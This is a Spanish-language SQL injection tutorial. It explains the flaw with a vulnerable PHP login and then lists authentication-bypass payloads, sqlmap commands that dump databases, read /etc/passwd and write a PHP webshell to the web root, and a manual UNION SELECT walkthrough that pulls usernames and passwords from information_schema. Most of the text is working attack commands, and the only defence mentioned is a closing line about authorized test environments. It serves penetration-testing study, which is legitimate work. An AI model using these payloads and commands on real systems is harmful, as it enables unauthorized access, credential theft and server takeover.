## ❓ ¿Qué es una SQL Injection?

Una **SQL Injection** es un tipo de ataque que ocurre cuando un atacante es capaz de "inyectar" código SQL malicioso en una consulta que se envía a la base de datos.

👉 En otras palabras: el atacante logra manipular las consultas a la base de datos para que hagan cosas no deseadas, como:

- obtener datos confidenciales,
- modificar o eliminar datos,
- saltarse controles de autenticación,
- ejecutar comandos administrativos en la base de datos.

## 📌 ¿Por qué ocurre?

Sucede cuando una aplicación web **no valida correctamente la entrada del usuario** antes de usarla en una consulta SQL.

## 🔍 Ejemplo sencillo

Supongamos que en una página de login tenemos este código en PHP:

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

Si el atacante, en el campo `password`, escribe:

```sql
' OR '1'='1
```

La consulta que se ejecuta es:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```

Como `'1'='1'` siempre es verdadero, es posible que el atacante logre iniciar sesión **sin conocer la contraseña**.

## 🔍 ¿Cómo detectamos si existe esta vulnerabilidad?

Cuando vemos campos a rellenar, intentaremos inyectar código y observaremos la respuesta.  
Lo primero es intentar **escapar del contexto actual** con entradas como:

```
[Nada]
'
"
`
')
")
`)
'))
"))
`))
```

Luego corregimos la consulta.  
Podemos automatizar esta tarea con diccionarios como [SecLists](https://github.com/danielmiessler/SecLists), que incluyen muchos payloads.

### Inyecciones comunes (manuales)

```sql
" or 1=1
" or 1=1#
" or 1=1--
" or 1=1/*
' or 1=1
' or 1=1#
' or 1=1--
' or 1=1/*
admin" #
admin" --
admin" or "1"="1
admin" or "1"="1"#
admin" or "1"="1"--
admin" or "1"="1"/*
admin" or 1=1
admin" or 1=1#
admin" or 1=1--
admin" or 1=1/*
admin") or "1"="1
admin") or "1"="1"#
admin") or "1"="1"--
admin") or "1"="1"/*
admin") or ("1"="1
admin") or ("1"="1"#
admin") or ("1"="1"--
admin") or ("1"="1"/*
admin"/*
admin"or 1=1 or ""="
admin' #
admin' --
admin' or '1'='1
admin' or '1'='1'#
admin' or '1'='1'--
admin' or '1'='1'/*
admin' or 1=1
admin' or 1=1#
admin' or 1=1--
admin' or 1=1/*
admin') or '1'='1
admin') or '1'='1'#
admin') or '1'='1'--
admin') or '1'='1'/*
admin') or ('1'='1
admin') or ('1'='1'#
admin') or ('1'='1'--
admin') or ('1'='1'/*
admin'/*
admin'or 1=1 or ''='
or 1=1
or 1=1#
or 1=1--
or 1=1/*
```

## 🤖 Automatizar el ataque

Podemos automatizar el ataque con herramientas como `sqlmap`.

### 1️⃣ Buscar bases de datos

Usamos la herramienta sobre la URL para buscar las bases de datos:

```bash
sqlmap -u http://<IP> --forms --dbs --batch
```

### 2️⃣ Enumerar las tablas

Si detecta bases de datos, inspeccionamos las tablas de una base de datos específica:

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> --tables --batch
```

### 3️⃣ Enumerar las columnas

Una vez tengamos las tablas, inspeccionamos las columnas que las componen:

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> --columns --batch
```

### 4️⃣ Extraer los datos

Cuando sepamos las columnas, le indicamos que nos muestre la información de las filas y columnas seleccionadas:

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> -C <NOMBRE_DE_LA_COLUMNA_1>,<NOMBRE_DE_LA_COLUMNA_2> --dump --batch
```

---

## 🎯 Ataques avanzados con SQLMap

Una vez que tenemos el ataque básico automatizado, podemos realizar técnicas más avanzadas:

### 🔹 Especificar el parámetro vulnerable

Si sabemos qué parámetro es vulnerable (por ejemplo `id`):

```bash
sqlmap -u "http://<IP>/pagina.php?id=1" -p id --dbs --batch
```

### 🔹 Aumentar el nivel y riesgo del ataque

SQLMap permite personalizar la agresividad del ataque:

```bash
sqlmap -u http://<IP> --forms --dbs --risk=3 --level=5 --batch
```

- `--risk=3`: permite payloads más agresivos (por defecto es `1`).
- `--level=5`: explora más tipos de inyecciones (por defecto es `1`).

### 🔹 Usar cookies (si la aplicación requiere autenticación)

Si la aplicación requiere sesión iniciada, podemos añadir la cookie:

```bash
sqlmap -u http://<IP> --cookie="PHPSESSID=XXXXXXXXXXXXX" --dbs --batch
```

### 🔹 Obtener el usuario actual de la base de datos

```bash
sqlmap -u http://<IP> --current-user --batch
```

### 🔹 Obtener la versión del motor de base de datos

```bash
sqlmap -u http://<IP> --banner --batch
```

### 🔹 Leer archivos del sistema (si es posible)

Si la inyección es lo suficientemente potente, podemos intentar leer archivos:

```bash
sqlmap -u http://<IP> --file-read="/etc/passwd" --batch
```

### 🔹 Escribir archivos en el servidor (WebShell)

```bash
sqlmap -u http://<IP> --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
```

---


# Guía Básica de Inyección SQL Manual (con UNION SELECT y técnicas comunes)

---

## ¿Qué es la inyección SQL manual?

Es cuando el atacante introduce código SQL malicioso directamente en los campos de entrada o en la URL, para manipular las consultas y obtener información no autorizada, sin usar herramientas automáticas.

---

## Paso 1: Detectar la vulnerabilidad

Inserta una comilla simple `'` en un parámetro de entrada (formulario, URL, etc.) y observa si la aplicación devuelve un error SQL o un comportamiento anómalo.

Ejemplo URL vulnerable:

http://ejemplo.com/product.php?id=1'

Si devuelve error, es posible que sea vulnerable.


Otra forma común es poner el número en negativo

http://ejemplo.com/product.php?id=-1

---

## Paso 2: Identificar el número de columnas con ORDER BY

Prueba consultas como:

http://ejemplo.com/product.php?id=1 ORDER BY 1--

http://ejemplo.com/product.php?id=1 ORDER BY 2--

http://ejemplo.com/product.php?id=1 ORDER BY 3--
...

Cuando aparezca un error, el número anterior indica la cantidad correcta de columnas.

---

## Paso 3: Usar UNION SELECT para obtener datos

El UNION SELECT permite combinar resultados de otra consulta para mostrar datos arbitrarios.

Ejemplo para 3 columnas:

http://ejemplo.com/product.php?id=1 UNION SELECT 1,2,3--

Si ves 1, 2 y 3 en la página, la inyección funciona.

---

## Paso 4: Extraer datos reales

Sustituye los números por columnas reales de una tabla, por ejemplo:

http://ejemplo.com/product.php?id=1 UNION SELECT username, password, 3 FROM users--

Esto mostrará los usuarios y contraseñas (o hashes) almacenados.

---

## Paso 5: Evitar errores y comentarios

- Usa -- o # para comentar el resto de la consulta original y evitar errores de sintaxis.
- Ajusta la inyección para no romper la consulta original.

---


## Otros trucos útiles

- Usa funciones como CONCAT() para unir columnas:

http://ejemplo.com/product.php?id=1 UNION SELECT CONCAT(username, 0x3a, password), null, null FROM users--

(0x3a es el carácter : en hexadecimal)

- Prueba inyecciones simples para verificar autenticación:

' OR '1'='1

- Comenta el resto para evitar errores:

' OR '1'='1' --

---

# 📌 Resumen de Ataque Manual SQLi

---

## 1️⃣ Averiguar el número de columnas

Probar con:

http://ejemplo.com/product.php?id=1 ORDER BY 100-- -

Si aparece un error como:

ORDER BY clause error

Vamos disminuyendo el número hasta que el error desaparezca.  
El último número que no genera error indica el número de columnas.

---

## 2️⃣ Probar UNION SELECT con el número de columnas encontrado

Ejemplo si hay 5 columnas:

http://ejemplo.com/product.php?id=1 UNION SELECT 1,2,3,4,5-- -

Si aparece algún número en la página, se puede reemplazar por funciones o datos.

Ejemplo para obtener el nombre de la base de datos actual:

http://ejemplo.com/product.php?id=1 UNION SELECT 1,DATABASE(),3,4,5-- -

---

## 3️⃣ Listar bases de datos

http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -

Si no muestra todas las bases de datos o da error, podemos paginar con LIMIT:

http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata LIMIT 0,1-- -
http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata LIMIT 1,1-- -
http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata LIMIT 2,1-- -
...

---

## 4️⃣ Listar nombres de las tablas de una base de datos
```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="<NOMBRE_BASE_DATOS>"-- -
```
---

## 5️⃣ Listar nombres de las columnas de una tabla
```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="<NOMBRE_BASE_DATOS>" AND table_name="<NOMBRE_TABLA>"-- -
```
---

## 6️⃣ Mostrar datos concatenados

Esto permite mostrar múltiples columnas en un solo campo visualizado:
```
http://ejemplo.com/product.php?id=1 UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUMNA2>),3,4,5 FROM <NOMBRE_BASE_DATOS>.<NOMBRE_TABLA>-- -
```
(0x3a representa el carácter ":")

---

## ✅ Notas

- Adaptar el número de columnas a las de la consulta original.
- Usar `-- -` o `#` para comentar el resto de la consulta original.
- Probar siempre en entornos de prueba autorizados.

---





